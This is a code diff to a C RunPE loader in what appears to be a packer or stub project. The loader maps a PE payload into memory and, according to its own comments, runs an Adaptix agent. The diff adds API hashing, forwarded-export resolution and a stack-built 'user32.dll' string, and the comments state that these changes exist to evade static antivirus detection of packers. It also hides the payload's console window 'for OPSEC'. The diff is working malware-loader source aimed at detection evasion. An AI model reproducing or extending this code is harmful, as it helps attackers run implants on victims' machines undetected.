@@ -21,7 +21,17 @@
 
 #include "RunPE.h"
 #include "NtApi.h"
+#include "..\Stub\ApiHashing.h"
 #include <winternl.h>
+
+/* Lazy-resolved via API hashing — keeping these out of the stub's static IAT
+ * removes the "GUI-subsystem exe importing AllocConsole/GetConsoleWindow/
+ * ShowWindow + RtlAddFunctionTable" anomaly that flags packers statically. */
+typedef BOOLEAN (NTAPI  *pfnRtlAddFunctionTable)(PIMAGE_RUNTIME_FUNCTION_ENTRY, DWORD, DWORD64);
+typedef BOOL    (WINAPI *pfnAllocConsole)(void);
+typedef HWND    (WINAPI *pfnGetConsoleWindow)(void);
+typedef BOOL    (WINAPI *pfnShowWindow)(HWND, int);
+typedef HMODULE (WINAPI *pfnLoadLibraryW)(LPCWSTR);
 
 #define RELOC_32BIT_FIELD   3
 #define RELOC_64BIT_FIELD   10
@@ -103,8 +113,31 @@ static HMODULE RunPE_GetModule(const char* dllNameA) {
     return NULL;
 }
 
-/* Walk module export directory by exact name — replaces GetProcAddress. */
-static FARPROC RunPE_GetExport(HMODULE hMod, const char* funcName) {
+/* Walk module export directory by exact name — replaces GetProcAddress.
+ *
+ * Forwarded exports: on Win10/11 kernel32 forwards many names to ntdll
+ * (e.g. InitializeCriticalSection -> NTDLL.RtlInitializeCriticalSection).
+ * For those, the EAT entry does not hold code — it holds an RVA INSIDE the
+ * export directory pointing at a "MODULE.Function" string.  Returning that
+ * RVA as a function pointer makes the caller execute ASCII text (the Adaptix
+ * MinGW agent died exactly this way on its first critsec call).  Forwarders
+ * are followed to the target module; depth is bounded for safety. */
+static FARPROC RunPE_GetExportR(HMODULE hMod, const char* funcName, int depth);
+static HMODULE RunPE_LoadDll(const char* dllNameA);
+
+static FARPROC RunPE_GetExportByOrdinal(HMODULE hMod, DWORD ordinal) {
+    PBYTE pBase = (PBYTE)hMod;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + ((PIMAGE_DOS_HEADER)pBase)->e_lfanew);
+    IMAGE_DATA_DIRECTORY exp = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!exp.Size || !exp.VirtualAddress) return NULL;
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + exp.VirtualAddress);
+    if (ordinal < pExp->Base || ordinal >= pExp->Base + pExp->NumberOfFunctions) return NULL;
+    DWORD frva = ((PDWORD)(pBase + pExp->AddressOfFunctions))[ordinal - pExp->Base];
+    if (!frva) return NULL;
+    return (FARPROC)(pBase + frva);
+}
+
+static FARPROC RunPE_GetExportR(HMODULE hMod, const char* funcName, int depth) {
     PBYTE pBase = (PBYTE)hMod;
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
     if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
@@ -119,10 +152,37 @@ static FARPROC RunPE_GetExport(HMODULE hMod, const char* funcName) {
         const char* en = (const char*)(pBase + pNames[i]);
         const char* fn = funcName;
         while (*en && *fn && *en == *fn) { en++; fn++; }
-        if (*en == *fn)
-            return (FARPROC)(pBase + pFuncs[pOrds[i]]);
+        if (*en == *fn) {
+            DWORD frva = pFuncs[pOrds[i]];
+            if (frva >= exp.VirtualAddress && frva < exp.VirtualAddress + exp.Size) {
+                /* Forwarder string "MODULE.Function" / "MODULE.#ord" */
+                const char* fwd = (const char*)(pBase + frva);
+                char modName[40];
+                int  m = 0;
+                if (depth > 4) return NULL;
+                while (*fwd && *fwd != '.' && m < 33) modName[m++] = *fwd++;
+                if (*fwd != '.') return NULL;
+                fwd++;
+                modName[m++]='.'; modName[m++]='d'; modName[m++]='l'; modName[m++]='l';
+                modName[m] = '\0';
+                HMODULE hTarget = RunPE_LoadDll(modName);
+                if (!hTarget) return NULL;
+                if (*fwd == '#') {
+                    DWORD ord = 0;
+                    fwd++;
+                    while (*fwd >= '0' && *fwd <= '9') { ord = ord * 10 + (DWORD)(*fwd - '0'); fwd++; }
+                    return RunPE_GetExportByOrdinal(hTarget, ord);
+                }
+                return RunPE_GetExportR(hTarget, fwd, depth + 1);
+            }
+            return (FARPROC)(pBase + frva);
+        }
     }
     return NULL;
+}
+
+static FARPROC RunPE_GetExport(HMODULE hMod, const char* funcName) {
+    return RunPE_GetExportR(hMod, funcName, 0);
 }
 
 /* Load a DLL: check PEB first, then call LoadLibraryW found via export walk.
@@ -389,11 +449,15 @@ DWORD RunPE(BYTE* pPeFile, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg
     PIMAGE_DATA_DIRECTORY pExceptDir =
         &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
     if (pExceptDir->Size && pExceptDir->VirtualAddress) {
-        PIMAGE_RUNTIME_FUNCTION_ENTRY pRtFunc =
-            (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pBase + pExceptDir->VirtualAddress);
-        DWORD entryCount =
-            (pExceptDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY));
-        RtlAddFunctionTable(pRtFunc, entryCount, (DWORD64)pBase);
+        pfnRtlAddFunctionTable pAddFuncTable = (pfnRtlAddFunctionTable)GetProcAddressH(
+            GetModuleHandleH(g_Hash_ntdll), g_Hash_RtlAddFunctionTable);
+        if (pAddFuncTable) {
+            PIMAGE_RUNTIME_FUNCTION_ENTRY pRtFunc =
+                (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pBase + pExceptDir->VirtualAddress);
+            DWORD entryCount =
+                (pExceptDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY));
+            pAddFuncTable(pRtFunc, entryCount, (DWORD64)pBase);
+        }
     }
 
     /* 9. NtFlushInstructionCache – flush instruction cache */
@@ -428,12 +492,36 @@ DWORD RunPE(BYTE* pPeFile, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg
 #endif
     pPeb->Reserved3[1] = pBase;
 
-    /* 11.5. Check if payload is a Console Application (CUI) and allocate Console to satisfy its MSVC CRT routines! */
+    /* 11.5. Check if payload is a Console Application (CUI) and allocate Console to satisfy its MSVC CRT routines!
+     * All three APIs resolved lazily — see the note at the top of this file. */
     if (pNt->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI) {
-        AllocConsole();
-        HWND hConsole = GetConsoleWindow();
-        if (hConsole) {
-            ShowWindow(hConsole, SW_HIDE); // Hide by default for OPSEC, payload can show it if needed
+        HMODULE hK32 = GetModuleHandleH(g_Hash_kernel32);
+        pfnAllocConsole     pAllocConsole     = (pfnAllocConsole)    GetProcAddressH(hK32, g_Hash_AllocConsole);
+        pfnGetConsoleWindow pGetConsoleWindow = (pfnGetConsoleWindow)GetProcAddressH(hK32, g_Hash_GetConsoleWindow);
+        if (pAllocConsole && pGetConsoleWindow) {
+            pAllocConsole();
+            HWND hConsole = pGetConsoleWindow();
+            if (hConsole) {
+                /* The stub is GUI-subsystem, so user32 may not be mapped yet —
+                 * load it on demand (normal behaviour for GUI apps). */
+                HMODULE hUser32 = GetModuleHandleH(g_Hash_user32);
+                if (!hUser32) {
+                    pfnLoadLibraryW pLLW = (pfnLoadLibraryW)GetProcAddressH(hK32, g_Hash_LoadLibraryW);
+                    if (pLLW) {
+                        /* Stack-built to keep "user32.dll" out of .rdata */
+                        WCHAR wUser32[11];
+                        wUser32[0]=L'u'; wUser32[1]=L's'; wUser32[2]=L'e'; wUser32[3]=L'r';
+                        wUser32[4]=L'3'; wUser32[5]=L'2'; wUser32[6]=L'.'; wUser32[7]=L'd';
+                        wUser32[8]=L'l'; wUser32[9]=L'l'; wUser32[10]=L'\0';
+                        hUser32 = pLLW(wUser32);
+                    }
+                }
+                if (hUser32) {
+                    pfnShowWindow pShowWindow = (pfnShowWindow)GetProcAddressH(hUser32, g_Hash_ShowWindow);
+                    if (pShowWindow)
+                        pShowWindow(hConsole, SW_HIDE); // Hide by default for OPSEC, payload can show it if needed
+                }
+            }
         }
     }
 
